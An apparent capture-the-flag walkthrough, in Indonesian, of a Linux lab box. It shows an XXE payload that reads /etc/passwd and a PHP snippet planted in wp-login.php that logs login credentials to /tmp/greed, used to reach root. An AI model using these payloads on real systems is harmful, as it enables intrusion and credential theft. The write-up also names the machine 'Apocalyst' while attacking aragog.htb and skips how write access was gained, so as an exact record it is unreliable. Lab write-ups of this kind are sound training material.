## **Informasi Mesin**
- **Nama**: Apocalyst
- **Sistem Operasi**: Linux
- **Tingkat Kesulitan**: Medium
- **Alamat IP**: 10.10.10.78
## **Tahap Enumerasi**

### **Pemindaian Jaringan**

Hasil pemindaian Nmap mengidentifikasi tiga port terbuka:
```bash
PORT    STATE   SERVICE     VERSION
21/tcp  open    ftp         vsftpd 3.0.3
22/tcp  open    ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp  open    http        Apache httpd 2.4.18
```
## **Tahap Eksploitasi Awal**

### **Enumerasi FTP**

Akses FTP mengungkapkan file `test.txt` dengan konten:
```xml
<details>
    <subnet_mask>255.255.255.192</subnet_mask>
    <test></test>
</details>
```
File ini terkait dengan fungsionalitas endpoint `http://aragog.htb/host.php`.
### **Parsing Subnet via Aplikasi Web**

Saat dikirim sebagai body POST ke `http://aragog.htb/host.php`, response menunjukkan:

```text
There are 62 possible hosts for 255.255.255.192
```

Ini mengindikasikan aplikasi web mem-parsing XML melalui POST, membuka kemungkinan eksploitasi XML External Entity (XXE).

## **Eksploitasi XXE Injection**

### **Uji Kerentanan XXE**

Payload berikut digunakan untuk menguji kerentanan:
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
    <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<details>
    <subnet_mask>&xxe;</subnet_mask>
</details>
```

### **Konfirmasi Kerentanan**

Response aplikasi:
```text
There are 4294967294 possible hosts for root:x:0:0:root:/root:/bin/bash ...
```

Ini membuktikan kerentanan XXE file disclosure, dengan konten `/etc/passwd` berhasil diekstraksi.

## **Enumerasi Pengguna**

### **Analisis /etc/passwd**

Dari hasil dump `/etc/passwd`, ditemukan dua pengguna:
```bash
florian:x:1000:1000:florian,,,:/home/florian:/bin/bash
cliff:x:1001:1001::/home/cliff:/bin/bash
```

Lokasi potensial private key SSH: `/home/florian/.ssh/id_rsa`

## **Credential Harvesting**

### **Monitoring Proses**

Melalui tools `pspy64`, teridentifikasi bahwa `wp-login.php` dieksekusi secara periodik oleh user `cliff`.

### **Payload PHP untuk Capture Credential**

Ditambahkan payload PHP ke file `wp-login.php`:
```php
<?php
$rrr = print_r($_REQUEST, true);
$fff = fopen("/tmp/greed", "a");
fwrite($fff, $rrr);
fclose($fff);
?>
```

Payload ini akan mencatat seluruh kredensial login ke dalam file `/tmp/greed` setiap kali proses login dilakukan.

### **Capture Login Credential**

Setelah payload aktif dan menunggu eksekusi cron, file `/tmp/greed` menunjukkan dua login attempt:
```text
Array ( [log] => administrator [pwd] => greed ... )
Array ( [pwd] => !KRgYs(JFO!&MTr)lf [log] => Administrator ... )
```

**Kredensial yang berhasil ditangkap:**

- **Username**: Administrator
- **Password**: `!KRgYs(JFO!&MTr)lf`
## **Eskalasi Hak Akses ke Root**

### **Login sebagai Root**

Menggunakan kredensial yang diperoleh:
```bash
su
Password: !KRgYs(JFO!&MTr)lf
```
### **Root Flag**

Berhasil mendapatkan akses root dan membaca flag:
```bash
cat /root/root.txt
```